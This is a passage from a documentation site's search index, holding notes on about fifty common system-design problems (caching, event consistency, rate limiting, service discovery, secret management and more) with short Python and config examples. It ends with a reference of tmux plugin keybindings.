Invalidate local cache for 'key'\n            local_cache.pop(key, None)\n</code></pre>"},{"location":"system_design/prob/#4-microservices-event-consistency","title":"4. Microservices &amp; Event Consistency","text":"<p>Solution Approach: Event-Driven Architecture with Kafka (Python Producer Example)</p> <pre><code>from kafka import KafkaProducer\nimport json\n\nproducer = KafkaProducer(\n    bootstrap_servers='localhost:9092',\n    value_serializer=lambda v: json.dumps(v).encode('utf-8')\n)\n\ndef publish_event(event):\n    producer.send('events_topic', event)\n    producer.flush()\n</code></pre>"},{"location":"system_design/prob/#5-real-time-notifications-outside-of-websockets","title":"5. Real-Time Notifications (Outside of WebSockets)","text":"<p>Solution Approach: Server-Sent Events (SSE) with Python Flask</p> <pre><code>from flask import Flask, Response\nimport time\n\napp = Flask(__name__)\n\n@app.route('/stream')\ndef stream():\n    def event_stream():\n        yield 'data: {\"message\": \"Connected\"}\\n\\n'\n        while True:\n            # Example: push periodic updates\n            time.sleep(5)\n            yield 'data: {\"message\": \"Update\"}\\n\\n'\n    return Response(event_stream(), mimetype=\"text/event-stream\")\n</code></pre>"},{"location":"system_design/prob/#6-task-scheduling-and-distribution","title":"6. Task Scheduling and Distribution","text":"<p>Solution Approach: Using Celery for Task Distribution (Python)</p> <pre><code># tasks.py\nfrom celery import Celery\n\napp = Celery('tasks', broker='redis://localhost:6379/0')\n\n@app.task\ndef process_image(image_id):\n    # Image processing logic here\n    return f\"Processed {image_id}\"\n</code></pre> <pre><code># Command to start worker:\ncelery -A tasks worker --loglevel=info\n</code></pre>"},{"location":"system_design/prob/#7-concurrency-control-and-data-races","title":"7. Concurrency Control and Data Races","text":"<p>Solution Approach: Optimistic Locking with SQL (PostgreSQL Example in Python)</p> <pre><code>import psycopg2\n\nconn = psycopg2.connect(\"dbname=test user=postgres\")\ncursor = conn.cursor()\n\ndef update_account_balance(account_id, amount, current_version):\n    sql = \"\"\"\n    UPDATE accounts\n    SET balance = balance - %s, version = version + 1\n    WHERE id = %s AND version = %s;\n    \"\"\"\n    cursor.execute(sql, (amount, account_id, current_version))\n    conn.commit()\n    return cursor.rowcount\n\nrows_affected = update_account_balance(1, 100, 2)\nif rows_affected == 0:\n    # Handle version mismatch, retry or abort\n    print(\"Update failed due to version mismatch\")\n</code></pre>"},{"location":"system_design/prob/#8-distributed-logging-monitoring","title":"8. Distributed Logging &amp; Monitoring","text":"<p>Solution Approach: Centralized Logging with Logstash (ELK Stack)</p> <p>logstash.conf excerpt: <pre><code>input {\n  file {\n    path =&gt; \"/var/log/myapp/*.log\"\n    start_position =&gt; \"beginning\"\n  }\n}\noutput {\n  elasticsearch { hosts =&gt; [\"localhost:9200\"] }\n}\n</code></pre></p>"},{"location":"system_design/prob/#9-cdn-edge-caching-for-latency-reduction","title":"9. CDN &amp; Edge Caching for Latency Reduction","text":"<p>Solution Approach: CDN Configuration Example in HTML</p> <pre><code>&lt;!-- Reference static asset using a CDN URL --&gt;\n&lt;img src=\"https://cdn.example.com/images/logo.png\" alt=\"Logo\"&gt;\n</code></pre> <p>Note: The CDN setup itself is handled via provider configuration, not code.</p>"},{"location":"system_design/prob/#10-failures-and-fault-tolerance","title":"10. Failures and Fault Tolerance","text":"<p>Solution Approach: Circuit Breaker Pattern (Python Pseudocode)</p> <pre><code>import time\n\nclass CircuitBreaker:\n    def __init__(self, threshold, timeout):\n        self.failure_count = 0\n        self.threshold = threshold\n        self.timeout = timeout\n        self.state = 'CLOSED'\n        self.last_failure_time = None\n\n    def call(self, func, *args, **kwargs):\n        if self.state == 'OPEN' and (time.time() - self.last_failure_time) &lt; self.timeout:\n            raise Exception('Circuit is open')\n        try:\n            result = func(*args, **kwargs)\n            self.failure_count = 0\n            self.state = 'CLOSED'\n            return result\n        except Exception as e:\n            self.failure_count += 1\n            self.last_failure_time = time.time()\n            if self.failure_count &gt;= self.threshold:\n                self.state = 'OPEN'\n            raise e\n\n# Usage example\nbreaker = CircuitBreaker(threshold=3, timeout=60)\ntry:\n    result = breaker.call(some_external_service_call)\nexcept Exception as e:\n    print(e)\n</code></pre> <p>Note: These examples aim to illustrate the essence of each approach. In production systems, implementations require more robust error handling, configuration options, and integration testing.</p>"},{"location":"system_design/prob/#11-api-rate-limiting-and-throttling","title":"11. API Rate Limiting and Throttling","text":"<p>Problem - Public APIs or internal microservices can be bombarded by excessive requests (malicious or accidental). - Without controls, this can degrade service performance or even take down critical components.</p> <p>Solution Approaches - Token Bucket/Leaky Bucket Algorithms: Keep track of request tokens that refill over time; once tokens are depleted, throttle new requests. - Centralized API Gateway: A gateway layer that enforces rate limits for all upstream services (e.g., Kong, AWS API Gateway). - Distributed Rate Limiting: Use Redis or another shared store to coordinate rate limits across multiple servers.</p>"},{"location":"system_design/prob/#12-data-migration-and-schema-evolution","title":"12. Data Migration and Schema Evolution","text":"<p>Problem - Production databases need schema or data changes without downtime. - Large migrations can lock tables, cause major performance hits, or break old code expecting a different schema.</p> <p>Solution Approaches - Blue-Green or Rolling Deployments: Spin up new versions of the service or DB while the old version is still running, then switch traffic. - Backward-Compatible Changes (Expand-Contract Pattern): Deploy code that can handle both old and new schema before actually switching the schema. - Online Schema Migration Tools (e.g., gh-ost, pt-online-schema-change): Perform table changes in a way that minimizes locking and downtime.</p>"},{"location":"system_design/prob/#13-strong-consistency-vs-eventual-consistency","title":"13. Strong Consistency vs. Eventual Consistency","text":"<p>Problem - Some systems demand immediate, strict consistency (e.g., banking transactions). Others can tolerate a slight delay (e.g., social media feeds). - Choosing the wrong model can cripple performance or the user experience.</p> <p>Solution Approaches - Strong Consistency: Requires more coordination (two-phase commit, distributed transactions). Slower but real-time correctness. - Eventual Consistency: Systems like Cassandra or DynamoDB replicate asynchronously; faster writes, but short-term stale reads may occur. - Hybrid Models: Some system parts require strong consistency (e.g., user authentication), while others can be eventually consistent (e.g., analytics).</p>"},{"location":"system_design/prob/#14-feature-toggles-and-canary-releases","title":"14. Feature Toggles and Canary Releases","text":"<p>Problem - Rolling out a new feature to 100% of users at once is risky. If something is wrong, there\u2019s a huge blast radius. - Hard to roll back or mitigate if the deployment is large and complex.</p> <p>Solution Approaches - Feature Flags: Wrap features in toggles that can be turned on/off without a redeploy. Useful for controlled rollouts or A/B testing. - Canary Deployments: Expose the new version to a small percentage of users first. If stable, gradually increase. - Blue-Green Deployment: Maintain two production environments (blue and green). Switch traffic from one to the other post-verification.</p>"},{"location":"system_design/prob/#15-infrastructure-as-code-and-cicd-pipelines","title":"15. Infrastructure as Code and CI/CD Pipelines","text":"<p>Problem - Manually configuring servers leads to inconsistencies and \u201csnowflake\u201d servers. - Slow or error-prone deployments hinder agility and reliability.</p> <p>Solution Approaches - Infrastructure as Code (IaC): Define servers and networking in files (Terraform, CloudFormation), use version control. - Automated CI/CD: Pipelines (Jenkins, GitLab CI, GitHub Actions) automate builds, tests, and deployments. - Immutable Infrastructure: Spin up new servers or containers for each deploy rather than patching existing ones.</p>"},{"location":"system_design/prob/#16-global-latency-and-data-locality","title":"16. Global Latency and Data Locality","text":"<p>Problem - Serving a global user base from one region leads to high latency for distant clients. - Potential data-sovereignty or compliance issues if user data can\u2019t leave a certain country/region.</p> <p>Solution Approaches - Multiple Regions / Multi-Cloud: Deploy services closer to where users are. - Geo-Replication of Databases: Copies of data in each region, often eventually consistent. - Edge Compute: Place serverless or \u201cedge\u201d functions near the user\u2019s location for minimal latency.</p>"},{"location":"system_design/prob/#17-large-file-media-handling","title":"17. Large File / Media Handling","text":"<p>Problem - Storing and serving large files (videos, images) from the main app servers is expensive and can crush bandwidth. - Slow requests block or degrade core service performance.</p> <p>Solution Approaches - Object Storage (AWS S3, Google Cloud Storage): Keep large assets separate from the main app. - CDN: Cache and deliver static/media files from edge nodes, reducing load on your core. - Chunked Uploads: For very large files, use multipart uploads with resume capabilities.</p>"},{"location":"system_design/prob/#18-handling-spiky-or-seasonal-traffic","title":"18. Handling Spiky or Seasonal Traffic","text":"<p>Problem - Traffic surges (sales, product launches) overwhelm your infrastructure. - Over-provisioning 24/7 is costly and wasteful.</p> <p>Solution Approaches - Autoscaling: Automatically add/remove instances based on metrics (CPU, RAM, custom). - Queueing &amp; Throttling: Smooth out incoming request spikes by placing them in a queue. - Circuit Breakers &amp; Graceful Degradation: Temporarily turn off non-critical features if load is too high.</p>"},{"location":"system_design/prob/#19-search-and-indexing-at-scale","title":"19. Search and Indexing at Scale","text":"<p>Problem - Full-text search or complex queries on large data sets is slow with naive DB usage. - Simple indexes may not handle advanced text analysis or near-real-time updates.</p> <p>Solution Approaches - Dedicated Search Engines: Elasticsearch, Solr, or OpenSearch for high-performance text search. - Distributed Indexes: Shard the index across multiple nodes for parallel search. - Pipelines: Use something like Kafka + Logstash to feed data to search engine indices in near real-time.</p>"},{"location":"system_design/prob/#20-security-in-distributed-systems","title":"20. Security in Distributed Systems","text":"<p>Problem - Multiple microservices and endpoints = more attack surface. - Inconsistent or weak security practices can expose vulnerabilities.</p> <p>Solution Approaches - Central Auth/SSO: Identity Providers (OIDC, SAML) unify authentication and authorization. - mTLS (Mutual TLS): Ensure encrypted and authenticated service-to-service communication. - Zero-Trust Networking: Require authentication/authorization on every request, even inside the same network.</p>"},{"location":"system_design/prob/#how-to-use-these-in-system-design","title":"How to Use These in System Design","text":"<ul> <li>Each bullet is a common challenge encountered when building scalable, fault-tolerant systems.  </li> <li>You often need multiple patterns together (e.g., microservices plus centralized logging, circuit breakers, caching).  </li> <li>Refer to these whenever you face a new bottleneck or design puzzle; you\u2019ll see many of these patterns repeating in different forms.</li> </ul>"},{"location":"system_design/prob/#21-service-discovery","title":"21. Service Discovery","text":"<p>Problem - In a microservices environment with dynamic scaling, services come and go, making it hard to keep track of current IPs/ports. - Hardcoding service addresses is brittle; manual updates lead to downtime or stale configurations.</p> <p>Solution Approaches - Service Registry (e.g., Consul, Eureka, Zookeeper): Services register themselves and discover others via a central directory. - DNS-Based Discovery: Dynamically update DNS records when services scale up/down. - Sidecar Pattern: A sidecar container handles discovery on behalf of the main service, integrating with a service mesh or registry.</p>"},{"location":"system_design/prob/#22-service-mesh","title":"22. Service Mesh","text":"<p>Problem - Microservices often need consistent networking (encryption, retries, load balancing, observability). - Implementing these capabilities in each service duplicates logic and complicates development.</p> <p>Solution Approaches - Dedicated Data Plane (e.g., Envoy sidecars in Istio, Linkerd): Each service instance has a proxy that handles networking concerns uniformly. - Control Plane: Central service for managing configurations, certificates, routing rules. - Gradual Adoption: Start small with basic features (e.g., mTLS) and grow to traffic shaping and canary deployments.</p>"},{"location":"system_design/prob/#23-gossip-protocols","title":"23. Gossip Protocols","text":"<p>Problem - Need to share state (cluster membership, health checks) among nodes in a distributed system. - A centralized store might be a single point of failure; large-scale systems need a more decentralized approach.</p> <p>Solution Approaches - SWIM-Style Gossip: Periodic, random node-to-node communication to exchange membership info (e.g., Serf, HashiCorp Consul under the hood). - Anti-Entropy Protocols: Nodes gradually converge on a consistent state, tolerating partial failures and network partitions. - Push/Pull Gossip: Combination of sending updates (push) and requesting them (pull) ensures eventual consistency without a central point.</p>"},{"location":"system_design/prob/#24-secret-management","title":"24. Secret Management","text":"<p>Problem - Credentials, API keys, and other secrets must be stored securely, not hardcoded or committed to version control. - Rotating secrets without downtime is often challenging if they\u2019re embedded across multiple services.</p> <p>Solution Approaches - Vaults (e.g., HashiCorp Vault): Central secure storage and dynamic secret generation (short-lived tokens). - Kubernetes Secrets: Encrypted at rest; can be combined with external KMS for better security. - Parameter Stores (AWS SSM Parameter Store, Azure Key Vault): Centralize configurations and secrets, enforce access policies.</p>"},{"location":"system_design/prob/#25-offline-first-applications","title":"25. Offline-First Applications","text":"<p>Problem - Mobile or remote clients may lose connectivity. If the app fully depends on a live server, it becomes unusable offline. - Sync conflicts when connectivity is restored can cause inconsistent data if not managed properly.</p> <p>Solution Approaches - Local Storage &amp; Caching: Save user data locally (IndexedDB, SQLite) so the app can function offline. - Conflict Resolution: Use versioning or last-write-wins; for more complex scenarios, implement merges or user prompts for conflicts. - Background Sync: Upload changes and fetch updates once the device is back online, ideally in a seamless, queue-based approach.</p>"},{"location":"system_design/prob/#26-data-warehouse-vs-data-lake","title":"26. Data Warehouse vs. Data Lake","text":"<p>Problem - Large volumes of data from various sources need to be stored, processed, and analyzed. Traditional relational DBs become either too expensive or too rigid. - There\u2019s a tradeoff between structured data (easy queries, predefined schema) and raw/unstructured data (flexibility).</p> <p>Solution Approaches - Data Warehouse (e.g., Snowflake, BigQuery, Redshift): Structured schema, optimized for fast analytics; best for well-defined use cases. - Data Lake (e.g., Hadoop, S3-based lakes): Store raw data cheaply; schema-on-read approach. Flexible for data science exploration and machine learning. - Hybrid \u201cLakehouse\u201d: Combines cheap storage of a lake with warehousing capabilities (e.g., Databricks Delta Lake).</p>"},{"location":"system_design/prob/#27-streaming-data-pipelines","title":"27. Streaming Data Pipelines","text":"<p>Problem - High-volume event streams need near real-time processing (e.g., analytics, fraud detection, log aggregation). - Batch processing (e.g., nightly jobs) can be too slow for real-time insights.</p> <p>Solution Approaches - Message Brokers (Kafka, Pulsar): Durable, high-throughput event pipelines; consumers can process data on the fly. - Stream Processing Frameworks (Spark Streaming, Flink): Windowing, aggregations, and stateful computations at scale. - Lambda Architecture: Combine a real-time stream layer (fast but approximate) with a batch layer (slower but exact).</p>"},{"location":"system_design/prob/#28-multi-region-failover","title":"28. Multi-Region Failover","text":"<p>Problem - A single region or data center is a single point of failure. Outages, natural disasters, or network splits can take the entire system offline. - Maintaining consistent data across regions is complex, especially for writes.</p> <p>Solution Approaches - Active-Passive: One region is primary; a secondary region stands by to take over if the primary fails (DNS or failover orchestration switch). - Active-Active: Multiple regions serve traffic simultaneously, requiring advanced replication and conflict resolution. - Latency-Based Routing: Some users automatically connect to their closest region; if that region fails, requests route to another.</p>"},{"location":"system_design/prob/#29-monitoring-vs-observability","title":"29. Monitoring vs. Observability","text":"<p>Problem - Monitoring alone (CPU, RAM, basic metrics) may not provide enough insight into complex distributed issues. - Tracing, structured logs, and more detailed metrics are needed to fully understand system behavior.</p> <p>Solution Approaches - Monitoring: Use metrics (Prometheus, Datadog) and alert on thresholds. - Observability: Implement tracing (Jaeger, Zipkin), structured logging (ELK stack), and correlation IDs. Helps pinpoint the root cause faster. - Unified Dashboards: Aggregate logs, metrics, and traces in a single place (e.g., Grafana, Splunk) for a comprehensive view.</p>"},{"location":"system_design/prob/#30-autoscaling-container-workloads","title":"30. Autoscaling Container Workloads","text":"<p>Problem - Demand fluctuates unpredictably. Manually scaling containers (e.g., in Kubernetes) isn\u2019t practical. - Over-provisioning leads to wasted resources; under-provisioning degrades performance.</p> <p>Solution Approaches - Kubernetes HPA (Horizontal Pod Autoscaler): Scales pods based on CPU/Memory or custom metrics. - Cluster Autoscaler: Adds/removes worker nodes in response to overall cluster demand. - Event-Driven Autoscaling: Use external triggers (e.g., queue length, requests per second) to auto-scale more precisely.</p>"},{"location":"system_design/prob/#how-to-use-these-2130-in-system-design","title":"How to Use These (21\u201330) in System Design","text":"<ul> <li>Each point represents a frequent challenge or scenario in distributed systems.  </li> <li>Consider them an extension to the earlier 1\u201320 list, covering advanced topics like service discovery, service mesh, and observability.  </li> <li>Real-world design often involves multiple patterns working in tandem (e.g., a multi-region, microservices app with advanced autoscaling and robust secret management).</li> </ul>"},{"location":"system_design/prob/#31-modular-monolith-vs-microservices","title":"31. Modular Monolith vs. Microservices","text":"<p>Problem - Large monolithic codebase becomes unwieldy, but a full microservices approach is complex. - Teams want to break it down in a structured way without overcomplicating deployments.</p> <p>Solution Approaches - Modular Monolith: Keep a single deployment artifact but split features into well-defined modules with clear boundaries. - Migration Path: Gradually extract modules into separate services as needed, only when they truly require independent scaling or separate lifecycles. - Domain-Driven Design: Identify bounded contexts to delineate modules or potential microservices.</p>"},{"location":"system_design/prob/#32-event-sourcing-and-cqrs-in-practice","title":"32. Event Sourcing and CQRS in Practice","text":"<p>Problem - Traditional \u201cCRUD-based\u201d data updates lose the history of how state changed over time. Difficult to audit or reconstruct past states. - Complex business logic or workflows require a precise record of events.</p> <p>Solution Approaches - Event Sourcing: Store all changes as a sequence of events. State is derived by replaying events in order. Perfect for auditing and time-travel debugging. - CQRS: Split read and write models; commands update event logs, while separate queries read from a denormalized view. - Incremental Adoption: Start with critical domains (e.g., financial transactions) before going all-in across the system.</p>"},{"location":"system_design/prob/#33-idempotent-endpoints-and-retry-logic","title":"33. Idempotent Endpoints and Retry Logic","text":"<p>Problem - Network calls can fail or time out, causing clients to retry. Non-idempotent endpoints can create duplicate side effects (e.g., double-charging a user). - Hard to guarantee correctness if the same request arrives multiple times.</p> <p>Solution Approaches - Idempotent Endpoints: The same operation can be called multiple times without harmful duplication (e.g., use unique request IDs). - Server-Side De-Duplication: Maintain a short-lived cache of request IDs to detect repeats. - At-Least-Once vs. Exactly-Once Semantics: Clarify which guarantee is needed for each endpoint; design accordingly.</p>"},{"location":"system_design/prob/#34-handling-complex-data-validation","title":"34. Handling Complex Data Validation","text":"<p>Problem - Large, nested data structures with intricate validation rules can lead to brittle, scattered logic. - Code quickly becomes messy with if/else checks duplicated in multiple places.</p> <p>Solution Approaches - Validation Libraries: Use frameworks (e.g., pydantic in Python) to define schemas and constraints. - Layered Validation: Validate at multiple levels (API boundary, domain layer) to catch errors early and ensure invariants. - Configurable Rules: Externalize complex validation rules (e.g., JSON-based config or DSL) so you can change them without redeploying code.</p>"},{"location":"system_design/prob/#35-concurrency-patterns-for-cpu-bound-vs-io-bound-tasks","title":"35. Concurrency Patterns for CPU-Bound vs. I/O-Bound Tasks","text":"<p>Problem - Mixing CPU-bound computations with I/O-bound tasks in a single application can cause performance bottlenecks. - Using asynchronous frameworks (like asyncio) alone is insufficient for heavy CPU tasks that block the event loop.</p> <p>Solution Approaches - Async I/O: Great for tasks waiting on the network or disk, freeing up the loop to handle other requests. - Thread or Process Pools: For CPU-intensive segments, offload to workers (threads/processes) to avoid blocking the main event loop. - Micro-batching: Combine multiple small CPU tasks and run them in a single batch for efficiency on modern CPUs.</p>"},{"location":"system_design/prob/#36-plugin-architecture-and-extensibility","title":"36. Plugin Architecture and Extensibility","text":"<p>Problem - Core application needs custom or user-specific features without bloating the codebase. - Hard-coded logic leads to massive merges or code forks whenever a new feature is introduced.</p> <p>Solution Approaches - Plugin/Extension System: Separate \u201ccore\u201d from \u201cplugins\u201d that can be dynamically loaded at runtime. - Well-Defined Interfaces: Expose hooks or events in the core app that plugins can implement or listen to. - Package Repositories: Publish plugins as separate packages (PyPI, npm, etc.) for versioned, modular distribution.</p>"},{"location":"system_design/prob/#37-large-in-memory-collections-streaming","title":"37. Large In-Memory Collections &amp; Streaming","text":"<p>Problem - Processing huge collections (millions of items) in memory can lead to memory exhaustion. - Single-pass batch operations stall the system while processing, causing timeouts or OOM (out of memory) issues.</p> <p>Solution Approaches - Streaming / Iterators: Process data chunks incrementally, freeing memory as you go. - Lazy Evaluation: Only compute data when needed; libraries like Python\u2019s <code>itertools</code> or Rx (Reactive Extensions) can help. - MapReduce Style: For extremely large data sets, distribute across multiple nodes, each handling a partition of the data.</p>"},{"location":"system_design/prob/#38-partial-updates-patch-endpoints","title":"38. Partial Updates &amp; Patch Endpoints","text":"<p>Problem - Updating large objects by sending the entire payload each time wastes bandwidth and can overwrite concurrent changes. - Need fine-grained updates (e.g., just updating one field) with concurrency control.</p> <p>Solution Approaches - PATCH Method: Use JSON Patch or JSON Merge Patch to only send changed fields. - Optimistic Concurrency Control: Use version or ETag headers to detect conflicting updates. - Granular APIs: Provide endpoints for specific sub-resources or fields if partial updates are frequent.</p>"},{"location":"system_design/prob/#39-splitting-read-vs-write-in-monolithic-systems","title":"39. Splitting Read vs. Write in Monolithic Systems","text":"<p>Problem - Large monolith handles both read-heavy and write-heavy workloads, leading to performance bottlenecks and complex code paths. - Hard to optimize each path separately if they\u2019re all intertwined.</p> <p>Solution Approaches - Logical Separation: Within the same codebase, create distinct modules/services for reading vs. writing data. - Replicated Read Models: Keep a separate read-optimized store (e.g., denormalized) updated from the main write store. - Gradual Extraction: If performance demands grow, you can move read functionality into a separate microservice while the write side remains in the monolith.</p>"},{"location":"system_design/prob/#40-multi-threading-debugging-observability","title":"40. Multi-Threading Debugging &amp; Observability","text":"<p>Problem - Parallel code can have race conditions or deadlocks that are extremely hard to reproduce. - Traditional debugging tools provide limited insight into concurrency issues.</p> <p>Solution Approaches - Structured Logging: Tag logs with thread IDs, correlation IDs, or transaction IDs. - Concurrency Debug Tools: Tools like Python\u2019s <code>faulthandler</code>, or specialized concurrency checkers (Intel Inspector, thread sanitizers) for C/C++. - Traces &amp; Profilers: Use APM solutions (e.g., Jaeger, Zipkin in a multi-threaded environment) to visualize parallel execution flow.</p>"},{"location":"system_design/prob/#programming-focused-system-design-takeaways","title":"Programming-Focused System Design Takeaways","text":"<ul> <li>These problems (31\u201340) highlight application-level challenges: concurrency patterns, code organization, data validation, partial updates, etc.  </li> <li>They can be combined with earlier solutions (1\u201330) which addressed broader system-level or DevOps topics.  </li> <li>A real system typically mixes infrastructure concerns (scaling, networking) with software architecture best practices (modularity, concurrency, data handling).</li> </ul>"},{"location":"system_design/prob/#41-multi-tenant-code-architecture","title":"41. Multi-Tenant Code Architecture","text":"<p>Problem - Supporting multiple tenants (organizations or customers) in one codebase can lead to tangled code: different feature sets, data separation, and custom logic. - Hard to isolate data per tenant without introducing a lot of \u201cif tenant == X\u201d checks.</p> <p>Solution Approaches - Database Schema Per Tenant: Each tenant has its own schema or database; straightforward isolation but potentially more overhead. - Single Schema, Tenant ID Column: Simpler deployment, but must be vigilant about row-level filtering and permissions. - Configuration Layers: Define hooks or overrides for tenant-specific logic, possibly a plugin system. Keep core code \u201ctenant-agnostic.\u201d</p>"},{"location":"system_design/prob/#42-api-versioning-strategies-in-code","title":"42. API Versioning Strategies in Code","text":"<p>Problem - Public or internal APIs evolve, but existing clients may break if the API changes. - Maintaining backward compatibility becomes a headache, especially if code for old versions is mixed with new.</p> <p>Solution Approaches - URI Versioning (e.g., <code>/v1/resource</code>, <code>/v2/resource</code>): Easiest to implement, but can lead to code duplication. - Header or Content Negotiation: Clients request a version via headers; code can route requests accordingly. - Semantic Versioning &amp; Deprecation Policy: Communicate clearly when breaking changes are introduced and how long old versions will be supported.</p>"},{"location":"system_design/prob/#43-managing-domain-invariants-domain-driven-design","title":"43. Managing Domain Invariants &amp; Domain-Driven Design","text":"<p>Problem - Complex business logic often has rules (invariants) that must never be violated (e.g., \u201caccount balance can never go negative without overdraft protection\u201d). - Spreading these rules across controllers, services, and models leads to inconsistency.</p> <p>Solution Approaches - Aggregate Roots: Enforce invariants within the domain object that \u201cowns\u201d the data. - Value Objects: Encapsulate logic in small, immutable types (e.g., <code>Money</code>, <code>DateRange</code>) that validate themselves. - Domain Services: Centralize logic that spans multiple aggregates, ensuring the rules remain consistent.</p>"},{"location":"system_design/prob/#44-integration-testing-with-external-services","title":"44. Integration Testing with External Services","text":"<p>Problem - Writing automated tests that rely on external APIs (payment gateways, messaging services) is brittle and slow. - Hard to test error conditions or unusual edge cases without hooking into a live environment.</p> <p>Solution Approaches - Mocking &amp; Stubs: Replace external calls with mock implementations or local test doubles. - Contract Testing: Use frameworks (e.g., Pact) to ensure your service and the external service adhere to an agreed-upon contract. - Sandbox Environments: Some vendors offer sandbox APIs that mimic production behavior but allow test data and error simulations.</p>"},{"location":"system_design/prob/#45-performance-tuning-profiling-large-scale-code","title":"45. Performance Tuning &amp; Profiling Large-Scale Code","text":"<p>Problem - As traffic grows, certain code paths become slow or CPU-heavy. Identifying bottlenecks by guesswork is inefficient. - Memory leaks or high GC overhead degrade performance but are hard to track down.</p> <p>Solution Approaches - Profilers (e.g., cProfile, PyInstrument in Python): Attach them to running code, get detailed call stacks and timings. - Sampling vs. Instrumentation: Sampling profilers periodically capture stack traces (lighter); instrumentation adds overhead but provides more precise metrics. - Continuous Profiling: Tools that run in production with minimal overhead (e.g., Pyroscope, Datadog Profiler) help catch real-world bottlenecks.</p>"},{"location":"system_design/prob/#46-error-handling-patterns-fail-fast-vs-graceful-degradation","title":"46. Error Handling Patterns (Fail-Fast vs. Graceful Degradation)","text":"<p>Problem - A codebase that swallows exceptions or returns ambiguous errors makes debugging painful. - Overly defensive code can mask real issues; a single failure might cascade if not handled consistently.</p> <p>Solution Approaches - Fail Fast: As soon as a violation or impossible state is detected, throw an error. Don\u2019t continue with corrupted data. - Global Exception Handlers: At framework boundaries, log the error and return an appropriate response or fallback. - Graceful Degradation: For non-critical features, provide a partial result or fallback path instead of failing completely.</p>"},{"location":"system_design/prob/#47-circuit-breaker-pattern-in-application-code","title":"47. Circuit Breaker Pattern in Application Code","text":"<p>Problem - Calling an unstable external service repeatedly can slow down the entire app if it\u2019s timing out or erroring. - Without a mechanism to \u201ctrip,\u201d your code keeps hammering the failing resource, exacerbating the problem.</p> <p>Solution Approaches - Circuit Breaker Libraries (e.g., Polly for .NET, resilience libraries in Python/Java): They track recent errors. If failures exceed a threshold, \u201copen\u201d the circuit. - Fallback Logic: Provide alternate code paths when the breaker is open (cached response, default data). - Close Cycle: After a cooldown period, attempt a few requests to see if the service is healthy again.</p>"},{"location":"system_design/prob/#48-using-typed-schemas-across-microservices","title":"48. Using Typed Schemas Across Microservices","text":"<p>Problem - Different microservices exchanging data with JSON can drift in structure over time, causing runtime errors or missing fields. - Hard to keep data models consistent as code changes across repos.</p> <p>Solution Approaches - Shared Schema Definitions (e.g., protobuf for gRPC, JSON schemas in a common repo): Each service compiles or generates code from the same schema. - Schema Registry: A central place to manage schema versions (e.g., Confluent Schema Registry for Avro/Kafka). - Typed Clients: Generate client libraries from the schema so that changes are caught at compile time instead of runtime (where possible).</p>"},{"location":"system_design/prob/#49-designing-for-offline-or-scheduled-tasks","title":"49. Designing for Offline or Scheduled Tasks","text":"<p>Problem - Some operations (e.g., generating large reports, sending out newsletters) can\u2019t be completed instantly in a request/response cycle. - Synchronous endpoints that try to handle these tasks risk timeouts and poor user experience.</p> <p>Solution Approaches - Async Queue: Clients submit a request that enqueues a job; a worker processes it asynchronously. - Polling / Callbacks: The user can check progress or the server can notify when finished. - Cron Jobs: For recurring tasks, schedule them with cron-like services (e.g., Celery beat in Python).</p>"},{"location":"system_design/prob/#50-code-readability-maintainability","title":"50. Code Readability &amp; Maintainability","text":"<p>Problem - Large codebases quickly become messy if developers don\u2019t follow consistent style or best practices. - Technical debt accumulates, leading to slow feature development and high onboarding friction.</p> <p>Solution Approaches - Coding Standards &amp; Linters: Enforce a shared style (PEP 8, ESLint, etc.) and consistent patterns (naming, structure). - Modular Design: Break code into self-contained modules or packages with clear responsibilities. - Refactoring Discipline: Continuously refactor old code to keep it aligned with current architectural standards; use code reviews to maintain quality. ```</p>"},{"location":"tools/tmux/","title":"TMUX Plugins Keybindings and Usage Notes","text":"<p>This note outlines keybindings and usage for a selection of TMUX plugins, assuming <code>C-a</code> (Control+a) is set as the prefix key. Adjust these keybindings according to your TMUX configuration.</p>"},{"location":"tools/tmux/#general-plugins","title":"General Plugins","text":""},{"location":"tools/tmux/#tpm-tmux-plugin-manager","title":"TPM (Tmux Plugin Manager)","text":"<ul> <li>Reload TMUX environment: <code>C-a</code> + <code>I</code></li> <li>Reloads TMUX environment and installs any new plugins specified in <code>.tmux.conf</code>.</li> <li>Update installed plugins: <code>C-a</code> + <code>U</code></li> <li>Updates all installed plugins to their latest versions.</li> <li>Remove/uninstall plugins not on the plugin list: <code>C-a</code> + <code>alt+u</code></li> <li>Cleans up plugins that are no longer listed in your <code>.tmux.conf</code>.</li> </ul>"},{"location":"tools/tmux/#tmux-resurrect","title":"tmux-resurrect","text":"<ul> <li>Save TMUX environment: <code>C-a</code> + <code>Ctrl+s</code></li> <li>Saves the current TMUX session, windows, panes, and their layouts.</li> <li>Restore TMUX environment: <code>C-a</code> + <code>Ctrl+r</code></li> <li>Restores the previously saved TMUX session.</li> </ul>"},{"location":"tools/tmux/#tmux-sensible","title":"tmux-sensible","text":"<ul> <li>Provides sensible default settings for TMUX. No specific keybindings, it enhances overall user experience automatically.</li> </ul>"},{"location":"tools/tmux/#navigation-utilities","title":"Navigation &amp; Utilities","text":""},{"location":"tools/tmux/#vim-tmux-navigator","title":"vim-tmux-navigator","text":"<ul> <li>Seamless navigation between TMUX panes and vim splits:</li> <li>Navigate between vim and TMUX panes using <code>C-h</code>, <code>C-j</code>, <code>C-k</code>, <code>C-l</code> without needing to prefix with <code>C-a</code>.</li> </ul>"},{"location":"tools/tmux/#tmux-open","title":"tmux-open","text":"<ul> <li>Open files and URLs from TMUX panes:</li> <li>Open file/URL under cursor: <code>C-a</code> + <code>o</code></li> <li>This command attempts to open the item in the most appropriate application.</li> </ul>"},{"location":"tools/tmux/#tmux-yank","title":"tmux-yank","text":"<ul> <li>Yank (copy) text to the clipboard:</li> <li>Copy mode: <code>C-a</code> + <code>[</code>, then navigate to text, start selection with <code>Space</code>, move, and yank with <code>Enter</code>.</li> <li>Yanked text is copied to the system clipboard.</li> </ul>"},{"location":"tools/tmux/#tmux-fzf-url","title":"tmux-fzf-url","text":"<ul> <li>Open URLs using fzf:</li> <li>Open URL from pane: <code>C-a</code> + <code>u</code></li> <li>Lists URLs in the current pane using fzf, allowing you to select one to open in your default browser.</li> </ul>"}]}